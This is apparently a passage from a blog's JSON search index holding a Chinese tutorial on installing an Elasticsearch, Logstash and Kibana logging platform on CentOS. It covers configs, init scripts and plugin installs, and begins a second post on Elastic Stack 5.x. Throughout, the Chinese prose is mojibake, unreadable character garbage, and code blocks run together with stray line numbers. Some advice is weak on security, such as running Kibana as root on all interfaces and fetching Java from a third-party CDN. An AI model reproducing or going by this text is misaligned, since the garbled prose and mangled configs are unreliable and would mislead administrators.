ç‚¹å‡»å·¦ä¸Šè§’graphsï¼Œå°±èƒ½æŸ¥çœ‹æœ¬æœºæ‰€ç›‘æ§çš„æ‰€æœ‰è®¾å¤‡é»˜è®¤å­˜åœ¨ä¸€ä¸ªlocalhostï¼Œç›‘æ§æœ¬æœºçš„å†…å­˜ä½¿ç”¨ï¼Œæ´»åŠ¨ç”¨æˆ·ç­‰ä¿¡æ¯.","link":"/2014/10/21/æ€§èƒ½ç›‘æ§/cacti/äº†è§£Cactiç›‘æ§å®‰è£…ä¸é…ç½®/"},{"title":"ELK(Elasticsearch1.7+ + Logstash1.5+ + Kibana4.1)æ­å»ºæ—¥å¿—é›†ä¸­åˆ†æå¹³å°å®è·µ","text":"å…³æ³¨å¯å‚è€ƒï¼šæœ¬æ–‡å°†å®‰è£…Elasticsearch-1.7.2, Logstash-1.5.5, Kibana-4.1.5ã€‚ è¯·æ³¨æ„ç‰ˆæœ¬è¦æ±‚ï¼Œæœ‰äº›ç»„ä»¶éœ€è¦å“åº”çš„ç‰ˆæœ¬è¦æ±‚ã€‚logstashæ˜¯è´Ÿè´£æœé›†å’Œè½¬å‘æ—¥å¿—çš„ï¼Œesç”¨äºå­˜å‚¨å’Œæ£€ç´¢ï¼Œkibanaæä¾›webç«¯çš„å±•ç°â€¦ä»–ä»¬æ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œä¹Ÿå¯ä»¥éƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ï¼Œä¹Ÿå¯ä»¥ä¸åŒçš„æœºå™¨ã€‚ å¯ä»¥å…³æ³¨æˆ‘çš„Githubä¸Šé¢æœ‰è¯¦ç»†æ–‡æ¡£ï¼šhttps://github.com/yangcvo/ELK å¯åŠ¨è„šæœ¬ä¸‹è½½ï¼šhttps://github.com/yangcvo/ELK è¯¦ç»†é…ç½®ä¼˜åŒ–åšé›†ç¾¤ä¸å†™æ”¶é›†æ—¥å¿—è§„åˆ™æ•™ç¨‹: https://github.com/yangcvo/ELK ç»„ä»¶é¢„è§ˆ JDK http://www.oracle.com/technetwork/java/javase/downloads/index.html Elasticsearch https://www.elastic.co/downloads/elasticsearch Logstash https://www.elastic.co/downloads/logstash Kibanaä¸‹è½½åœ°å€:https://www.elastic.co/downloads/kibana redisä¸‹è½½åœ°å€: http://redis.io/download å‡†å¤‡å·¥ä½œ:æœåŠ¡ç«¯ï¼šç³»ç»Ÿcentos 6.7 ip:192.168.1.234 JDK1.8 Elasticsearch-1.7.2 Kibana-4.1.2å®¢æˆ·ç«¯ï¼šç³»ç»Ÿcentos 6.7 ip:192.168.1.235 JDK1.8 Logash-1.4.2 åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š1234567891011121314151617181920åˆ›å»ºSSLè¯ä¹¦çš„æ—¶å€™éœ€è¦é…ç½®FQDN#ä¿®æ”¹hostnamecat /etc/hostnameelk#ä¿®æ”¹hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.1.234 elk.ooxx.com elk#åˆ·æ–°ç¯å¢ƒhostname -F /etc/hostname#å¤æŸ¥ç»“æœhostname -felk.ooxx.comhostnameelk å…³é—­é˜²ç«å¢™1234567891011#service iptables stop#setenforce 0ä¸è¿‡è¿™é‡Œæˆ‘é˜²ç«å¢™æ˜¯å¼€å¯çš„ï¼ŒåæœŸæ·»åŠ å‡ºå»ç«¯å£å³å¯ã€‚æˆ–è€…å¯ä»¥ä¸å…³é—­é˜²ç«å¢™ï¼Œä½†æ˜¯è¦åœ¨iptablesä¸­æ‰“å¼€ç›¸å…³çš„ç«¯å£ï¼š# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart å®‰è£…javaï¼š12345ElasticSearchå’ŒLogstashä¾èµ–äºJDKï¼Œæ‰€ä»¥éœ€è¦å®‰è£…JDKï¼š# yum -y install java-1.8.0-openjdk*# java -versionè¿™é‡Œæˆ‘æ˜¯ç”¨yumå®‰è£…æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œä¸‹è½½taråŒ…ï¼Œæ³¨æ„è®¾ç½®javaè·¯å¾„ã€‚javaä¹Ÿå¯åˆ°è¿™ä¸ªåœ°å€ä¸‹è½½https://www.reucon.com/cdn/java/ å®‰è£…Elasticsearchï¼š1234567891011121314151617RPMå®‰è£…ä¸‹è½½ElasticSearch ElasticSearché»˜è®¤çš„å¯¹å¤–æœåŠ¡çš„HTTPç«¯å£æ˜¯9200ï¼ŒèŠ‚ç‚¹é—´äº¤äº’çš„TCPç«¯å£æ˜¯9300ã€‚.ä»¥ CentOS ä¸‹ä½¿ç”¨å®‰è£…åŒ…RPMå®‰è£…ï¼ƒmkdir -p /opt/software &amp;&amp; cd /opt/softwareï¼ƒwget -c https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.7.2.noarch.rpmï¼ƒrpm -ivh elasticsearch-1.7.2.noarch.rpmå¯ä»¥è‡ªå®šä¹‰ä¸‹å­˜å‚¨æ–‡ä»¶ç›®å½• ç”¨RPM å®‰è£…ã€‚vim /etc/elasticsearch/elasticsearch.ymlcluster.name: graylog-developmentnode.data: trueindex.number_of_shards: 5index.number_of_replicas: 1path.data: /home/data/es-data è‡ªå®šå­˜å‚¨ç›®å½•path.work: /home/data/es-worknetwork.host: 192.168.1.234 å¯åŠ¨esç›¸å…³æœåŠ¡12service elasticsearch startservice elasticsearch status esæºç å®‰è£…123456789101112131415è¿™é‡Œæˆ‘æ˜¯æºç å®‰è£…çš„ä¸‹è½½ElasticSearch ElasticSearché»˜è®¤çš„å¯¹å¤–æœåŠ¡çš„HTTPç«¯å£æ˜¯9200ï¼ŒèŠ‚ç‚¹é—´äº¤äº’çš„TCPç«¯å£æ˜¯9300ã€‚Elasticsearch - https://www.elastic.co/downloads/elasticsearchtar -zxvf elasticsearch-1.7.1.tar.gz -C /usr/local/ cd /usr/local/elasticsearch-1.7.1/config/ç„¶åç»™ç›®å½•åšä¸ªè½¯é“¾æ¥ï¼šln -s elasticsearch-1.7.1/ /usr/local/elasticsearchè¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼šé…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶mkdir /data/es-data -p mkdir /data/es-work -p mkdir /usr/local/elasticsearch-1.7.1/config/logs mkdir /usr/local/elasticsearch-1.7.1/config/plugins é…ç½®Elasticsearchï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566vim elasticsearch.ymlcluster.name: elasticsearch é›†ç¾¤åç§° #################################### Node ###################################### Node names are generated dynamically on startup, so you're relieved# from configuring them manually. You can tie this node to a specific name:#node.name: â€œlinux_esâ€ è¿™é‡Œæˆ‘åšäº†é›†ç¾¤æ‰€ä»¥éœ€è¦ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œè¿™é‡Œæˆ‘å†™äº†ä¸€ä¸ªèŠ‚ç‚¹åç§°# Every node can be configured to allow or deny being eligible as the master,# and to allow or deny to store the data.## Allow this node to be eligible as a master node (enabled by default):#node.master: true é›†ç¾¤master å¯åŠ¨## Allow this node to store data (enabled by default):#node.data: true æ•°æ®å­˜æ”¾true# Set the number of shards (splits) of an index (5 by default):#index.number_of_shards: 5# Set the number of replicas (additional copies) of an index (1 by default):#index.number_of_replicas: 1#################################### Paths ##################################### Path to directory containing configuration (this file and logging.yml):#path.conf: /usr/local/elasticsearch/config è¿™é‡Œå¼€å¯esé…ç½®æ–‡ä»¶ç›®å½•è·¯å¾„# Path to directory where to store index data allocated for this node.#path.data: /data/es-data esæ•°æ®å­˜æ”¾ç›®å½• è¿™é‡Œéœ€è¦è‡ªå·±æ–°å»ºç›®å½•## Can optionally include more than one location, causing data to be striped across# the locations (a la RAID 0) on a file level, favouring locations with most free# space on creation. For example:##path.data: /path/to/data1,/path/to/data2# Path to temporary files:#path.work: /data/es-work # Path to log files:#path.logs: /usr/local/elasticsearch/logs esçš„å­˜æ”¾æ—¥å¿— è¿™é‡Œéœ€è¦è‡ªå·±åˆ›å»ºä¸‹æ–‡ä»¶# Path to where plugins are installed:#path.plugins: /usr/local/elasticsearch/plugins eså®‰è£…æ’ä»¶å­˜æ”¾è·¯å¾„## Set this property to true to lock the memory:#bootstrap.mlockall: true æºç å®‰è£…å¯åŠ¨éœ€è¦æ‰§è¡Œ ï¼š/usr/local/elasticsearch/bin/elasticsearchæ‰èƒ½å¯åŠ¨ï¼› 1234567891011121314151617181920212223242526272829303132333435è¿™é‡Œéœ€è¦/etc/init.d/åˆ›å»ºå¯åŠ¨è„šæœ¬ã€‚å¯ä»¥åˆ°æˆ‘githubä¸Šé¢ä¸‹è½½ã€‚[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install è¿™é‡Œæ˜¯å®‰è£…esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch æŸ¥çœ‹å®‰è£…eså¯åŠ¨é…ç½®æ–‡ä»¶[root@ELK elasticsearch]# service elasticsearch start å¯åŠ¨es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 æœåŠ¡å·²å¯åŠ¨äº†ã€‚å¯åŠ¨ç›¸å…³æœåŠ¡service elasticsearch startservice elasticsearch statusé…ç½® elasticsearch æœåŠ¡éšç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨# chkconfig --add elasticsearchæµ‹è¯•ElasticSearchæœåŠ¡æ˜¯å¦æ­£å¸¸ï¼Œé¢„æœŸè¿”å›200çš„çŠ¶æ€ç # curl -X GET http://localhost:9200&#123; \"name\" : \"elk\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"1.7.2\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-01-03T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; å®‰è£… headã€marvelã€bigdeskæ’ä»¶:headæ’ä»¶123456789101112æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-headé‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹2.å»ºç«‹/usr/local/elasticsearch/plugins/head/æ–‡ä»¶3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°/usr/local/elasticsearch/plugins/head/é‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/ Marvelæ’ä»¶123456789101112Elasticsearch çš„é›†ç¾¤å’Œæ•°æ®ç®¡ç†ç•Œé¢ Marvel éå¸¸èµï¼Œå¯æƒœåªå¯¹å¼€å‘ç¯å¢ƒå…è´¹ï¼Œå‚è€ƒé“¾æ¥ï¼šhttps://www.elastic.co/guide/en/marvel/current/configuration.htmlæ’ä»¶å®‰è£…/usr/local/elasticsearch/bin/plugin -i elasticsearch/marvel/latesté‡å¯es å³å¯ã€‚å®Œæˆåé‡å¯æœåŠ¡è®¿é—® http://192.168.1.234:9200/_plugin/marvel/å¦‚ä½•çœ‹ä¸åˆ°ä¸‹é¢çš„é¡µé¢ï¼Œå°±ä¿®æ”¹ä¸‹è¿™é‡Œçš„å‚æ•°çœ‹çœ‹æœ‰æ²¡æœ‰é…ç½®ï¼švim elasticsearch.yml network.host: 192.168.1.234 åœ¨é‡å¯es ç„¶ååœ¨æŸ¥çœ‹å°±æœ‰æ•°æ®ã€‚ bigdeskæ’ä»¶123456çœ‹éœ€æ±‚å®‰è£…åŠŸèƒ½: ç›‘æ§æŸ¥çœ‹cpuã€å†…å­˜ä½¿ç”¨æƒ…å†µ,ç´¢å¼•æ•°æ®ã€æœç´¢æƒ…å†µ,httpè¿æ¥æ•°ç­‰å®‰è£…#/elstaicsearch/bin/plugin -i lukas-vlcek/bigdeské‡å¯es å³å¯ã€‚å®Œæˆåé‡å¯æœåŠ¡è®¿é—® http://192.168.1.234:9200/_plugin/bigdesk å®‰è£…Kibana:åœ¨esæœºå™¨ä¸Šé¢å®‰è£…kibana. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134åˆ°https://www.elastic.co/downloads/kibana æ‰¾åˆé€‚çš„ç‰ˆæœ¬ã€‚æ¯ä¸ªç‰ˆæœ¬ä¸‹é¢æœ‰è¿™ä¹ˆä¸€è¡Œå†…å®¹ï¼Œä¸€å®šè¦æ³¨æ„è¿™äº›å†…å®¹ï¼šCompatible with Elasticsearch 1.4.4 - 1.7cd /opt/software/ &amp;&amp; wget https://download.elastic.co/kibana/kibana/kibana-4.1.2-linux-x64.tar.gz#è§£å‹ï¼ƒtar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ï¼ƒcd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#åˆ›å»ºkibanaå¯åŠ¨è„šæœ¬æœåŠ¡vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esac#ä¿®æ”¹å¯åŠ¨æƒé™chmod +x /etc/rc.d/init.d/kibana#å¯åŠ¨kibanaæœåŠ¡service kibana startservice kibana status#æŸ¥çœ‹ç«¯å£netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node tcp 0 0 :::22 :::* LISTEN 1509/sshd é…ç½®Kibanaï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#ç¼–è¾‘kibana.yaml ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IPvi /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.port: 5601# The host to bind the server to.host: \"0.0.0.0\"# The Elasticsearch instance to use for all your queries.elasticsearch_url: \"http://localhost:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch_preserve_host: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.kibana_index: \".kibana\"# If your Elasticsearch is protected with basic auth, this is the user credentials# used by the Kibana server to perform maintence on the kibana_index at statup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied thorugh# the Kibana server)# kibana_elasticsearch_username: user# kibana_elasticsearch_password: pass# If your Elasticsearch requires client certificate and key# kibana_elasticsearch_client_crt: /path/to/your/client.crt# kibana_elasticsearch_client_key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsarech instance, put# the path of the pem file here.# ca: /path/to/your/CA.pem# The default application to load.default_app_id: \"discover\"# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# ping_timeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0request_timeout: 300000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.shard_timeout: 0# Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying# startup_timeout: 5000# Set to false to have a complete disregard for the validity of the SSL# certificate.verify_ssl: true# SSL for outgoing requests from the Kibana Server (PEM formatted)# ssl_key_file: /path/to/your/server.key# ssl_cert_file: /path/to/your/server.crt# Set the path to where you would like the process id file to be created.# pid_file: /var/run/kibana.pid# If you would like to send the log output to a file you can set the path below.# This will also turn off the STDOUT log output.# log_file: ./kibana.log# Plugins that are included in the build, and no longer found in the plugins/ folderbundled_plugin_ids:- plugins/dashboard/index- plugins/discover/index- plugins/doc/index- plugins/kibana/index- plugins/markdown_vis/index- plugins/metric_vis/index- plugins/settings/index- plugins/table_vis/index- plugins/vis_types/index- plugins/visualize/index å®‰è£…Logstashå®¢æˆ·ç«¯ï¼šç³»ç»Ÿcentos 6.7 ip:192.168.1.235 rpmå®‰è£…12345678#ä¸‹è½½rpmåŒ…wget https://download.elastic.co/logstash/logstash/packages/centos/logstash-1.5.4-1.noarch.rpm#å®‰è£…yum localinstall logstash-1.5.4-1.noarch.rpmè¿™é‡Œä¿®æ”¹ä¸‹hostsï¼švim /etc/hosts127.0.0.1 tomcat_A1 æºç å®‰è£…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354æˆ‘è¿™é‡Œæºç åŒ…å®‰è£…# wget https://download.elasticsearch.org/logstash/logstash/logstash-1.5.1.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-1.5.4.tar.gz#tar -zxvf logstash-1.5.1.tar.gz#mv logstash-1.5.1 /usr/local/#ln -s /usr/local/logstash-1.5.1/ /usr/local/logstashä¸‹è½½å¯åŠ¨è„šæœ¬ç”Ÿäº§éƒ½æ˜¯è¿è¡Œåœ¨åå°çš„ï¼Œæˆ‘è¿™é‡Œæºç å®‰è£…æ²¡æœ‰initè„šæœ¬å¯åŠ¨ã€‚ å»Githubä¸‹è½½ https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstashè¿™ä¸ªè„šæœ¬æˆ‘åšè¿‡ä¿®æ”¹ã€‚#å¯åŠ¨logstashæœåŠ¡service logstash startservice logstash status#æŸ¥çœ‹5000ç«¯å£netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshdä¿®æ”¹å¯åŠ¨è„šæœ¬vim /etc/init.d/logstash æŒ‡å®šçš„ç›®å½•è‡ªå·±æºç å®‰è£…çš„è·¯å¾„ã€‚name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash å®‰è£…è·¯å¾„LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf æ”¶é›†æ—¥å¿—çš„è§„åˆ™confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.htmlè¿™ä¸ªæ˜¯log stashçš„å®˜æ–¹æ–‡æ¡£çš„é…ç½®è¯´æ˜ã€‚è¿™ä¸ªé…ç½®è¯´æ˜ä¸Šé¢æˆ‘å…ˆä¿®æ”¹ä¸‹æˆ‘ä¹‹å‰çš„é…ç½®æ–‡ä»¶ã€‚ logstashæµ‹è¯•ï¼š1234å°†logstash.ooxx.comæ¢æˆä½ è‡ªå·±çš„åŸŸåã€‚åŒæ—¶ï¼Œåˆ°åŸŸåè§£æé‚£æ·»åŠ elk.ooxx.comçš„Aè®°å½•ã€‚ä½¿ç”¨é‚£ç§æ–¹å¼éƒ½è¡Œï¼Œä¸è¿‡å¦‚æœlogstashæœåŠ¡ç«¯çš„IPåœ°å€å˜æ¢äº†ï¼Œè¯ä¹¦ä¸å¯ç”¨äº†ã€‚è¿™é‡ŒæŸ¥çœ‹æ—¥å¿—æœ‰ä¸»æœºåè¿”å›ä¸ç„¶å°±è·Ÿä¸‹é¢ä¸€æ · hostï¼š0.0.0.0 1ï¼ƒ/usr/local/logstash/bin/logstash -e 'input &#123; stdin&#123; &#125; &#125; output &#123; stdout&#123;codec =&gt; rubydebug&#125; &#125;' 123456789101112131415161718192021é…ç½®log stashï¼å®ç°ç³»ç»Ÿæ—¥å¿—æ”¶é›†inputvim /etc/logstash.conf è¿™é‡Œæˆ‘ä»¬ä¹‹é—´å…ˆåˆ›å»ºä¸€ä¸ª.conf æˆ‘ä»¬å†™åœ¨ï¼etc/ ç¼–å†™å¥½ä»¥åè®©logstashå»è°ƒç”¨ã€‚ input &#123; stdin &#123; &#125; &#125; output &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" &#125; stdout &#123; codec =&gt; rubydebug &#125; &#125;ç„¶ååœ¨ç”¨logstashå»è°ƒç”¨/usr/local/logstash/bin/logstash -f /etc/logstash.conf vim /etc/logstash.conf å®˜æ–¹æ–‡æ¡£fileçš„é…ç½®æ–‡ä»¶å’Œç±»å‹ã€‚å®˜æ–¹æ–‡æ¡£ä¸‹é¢è¿˜æœ‰ä¸ªè¿™ä¸ªä»å¤´è¯»åˆ°å°¾è¿™æ ·è§„å®šï¼Œè¿™ä¸ªéå¸¸å¥½ï¼Œè¿™é‡Œæˆ‘åœ¨åšä¿®æ”¹ã€‚ 1234567ç„¶ååœ¨å¯åŠ¨log stashè„šæœ¬.# /etc/init.d/logstash start## ps -ef | grep logstashå¯åŠ¨å®Œäº†ä»¥ååœ¨æŸ¥çœ‹ä¸‹ï¼var/log/messages ç„¶ååœ¨ç™»é™†åˆ° http://192.168.1.234:9200/_plugin/head/ æ‰©å±•é˜…è¯»CentOS 7.xå®‰è£…ELK(Elasticsearch+Logstash+Kibana) Centos 6.5 å®‰è£…nginxæ—¥å¿—åˆ†æç³»ç»Ÿ elasticsearch + logstash + redis + kibana logstash-forwarder and grok examples Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/01/21/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/ELK-Elasticsearch-Logstash-Kibana-æ­å»ºæ—¥å¿—é›†ä¸­åˆ†æå¹³å°å®è·µ/"},{"title":"ElasticStack 5.xé›†ç¾¤+Kibana-5.5.x+Logstash5.5+kafka2.10ç‰ˆæœ¬éƒ¨ç½²æ¦‚è¿°","text":"ElasticStack 5.xä»‹ç»å‰è¨€ELK=ElasticSearch å®˜æ–¹åšå®¢:åˆ†å¸ƒå¼ä»¥åŠ Elastic Elastic Stackæ˜¯ELKæ—¥å¿—ç³»ç»Ÿçš„å®˜æ–¹ç§°å‘¼ï¼Œè€ŒELKåˆ™æ˜¯ç››ååœ¨å¤–çš„ä¸€æ¬¾å¼€æºåˆ†å¸ƒå¼æ—¥å¿—ç³»ç»Ÿï¼Œä¸€èˆ¬è¯´æ¥åŒ…æ‹¬äº†Elasticsearchã€Logstashå’ŒKibanaï¼Œæ¶µç›–äº†åç«¯æ—¥å¿—é‡‡é›†ã€æ—¥å¿—æœç´¢æœåŠ¡å’Œå‰ç«¯æ•°æ®å±•ç¤ºç­‰åŠŸèƒ½ã€‚æœ¬æ–‡å°†ä¼šå¯¹Elastic Stackçš„å®‰è£…éƒ¨ç½²æµç¨‹è¿›è¡Œä¸€ç³»åˆ—ç®€å•çš„ä»‹ç»ï¼Œå¹¶è®°å½•ä¸‹äº†ä¸€äº›éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°çš„å‘åŠè§£å†³æ–¹æ³•ã€‚ å¯¹äºä¸€ä¸ªè½¯ä»¶æˆ–äº’è”ç½‘å…¬å¸æ¥è¯´ï¼Œå¯¹è®¡ç®—èµ„æºå’Œåº”ç”¨è¿›è¡Œç›‘æ§å’Œå‘Šè­¦æ˜¯éå¸¸åŸºç¡€çš„éœ€æ±‚ã€‚å¯¹äºå¤§å…¬å¸æˆ–æˆç†Ÿå…¬å¸ï¼Œä¸€ä¸ªé«˜åº¦å®šåˆ¶åŒ–çš„ç›‘æ§ç³»ç»Ÿåº”è¯¥å·²ç»å­˜åœ¨äº†å¾ˆé•¿æ—¶é—´å¹¶ä¸”éå¸¸æˆç†Ÿäº†ã€‚è€Œå¯¹äºä¸€ä¸ªåˆåˆ›å…¬å¸æˆ–å°å…¬å¸æ¥è¯´ï¼Œå¦‚ä½•åˆ©ç”¨ç°æœ‰å¼€æºå·¥å…·å¿«é€Ÿæ­å»ºä¸€å¥—æ—¥å¿—ç›‘æ§åŠåˆ†æå¹³å°æ˜¯éœ€è¦æ¢ç´¢çš„äº‹æƒ…ã€‚ ç›‘æ§ç³»ç»Ÿçš„ç”¨æˆ·ï¼š è¿ç»´ï¼Œå¼€å‘ï¼Œäº§å“ ç›‘æ§ç³»ç»Ÿåº”è¯¥å¯ä»¥è§£å†³å¦‚ä¸‹çš„é—®é¢˜ï¼š ç›‘æ§serverçš„å„é¡¹åŸºç¡€æŒ‡æ ‡ï¼Œæ¯”å¦‚memory,cpu,load,networkç­‰ ç›‘æ§åº”ç”¨çš„çŠ¶æ€ã€‚ æœé›†åº”ç”¨æ—¥å¿—ï¼Œå¹¶è¿›è¡Œåˆ†æå’Œç»Ÿè®¡ã€‚é€šè¿‡æ—¥å¿—åˆ†æå’Œç»Ÿè®¡å¯å¾—åˆ°åº”ç”¨çš„è®¿é—®ç»Ÿè®¡ï¼Œå¼‚å¸¸ç»Ÿè®¡ï¼Œä¸šåŠ¡ç»Ÿè®¡ã€‚å…·æœ‰è¿›è¡Œå¤§è§„æ¨¡æ—¥å¿—æ•°æ®çš„åˆ†æå’Œå¤„ç†èƒ½åŠ›ã€‚ å¯åˆ¶å®šå‘Šè­¦è§„åˆ™ã€‚å„ç§ç›‘æ§æ•°æ®è¿›å…¥ç³»ç»Ÿåï¼Œå¯ä»¥æ ¹æ®æ¡ä»¶è§¦å‘å‘Šè­¦ï¼Œå®æ—¶çš„å°†åº”ç”¨å¼‚å¸¸æƒ…å†µæ¨é€åˆ°è¿ç»´ã€å¼€å‘æˆ–ä¸šåŠ¡äººå‘˜çš„IM/SMSä¸Šã€‚ å¯å®šåˆ¶çš„çœ‹æ¿ã€‚å¯ä»¥å°†å„ç§å®æ—¶ç»Ÿè®¡æˆ–æŠ¥è¡¨ç›´è§‚çš„æ˜¾ç¤ºå‡ºæ¥ã€‚ å¯é€‰æ–¹æ¡ˆï¼šæ—¥å¿—å®ï¼Œæ—¥å¿—æ˜“ï¼ŒLogtail(é˜¿é‡Œäº‘) è¿™æ˜¯æˆ‘ä»¬åé¢æ¢ 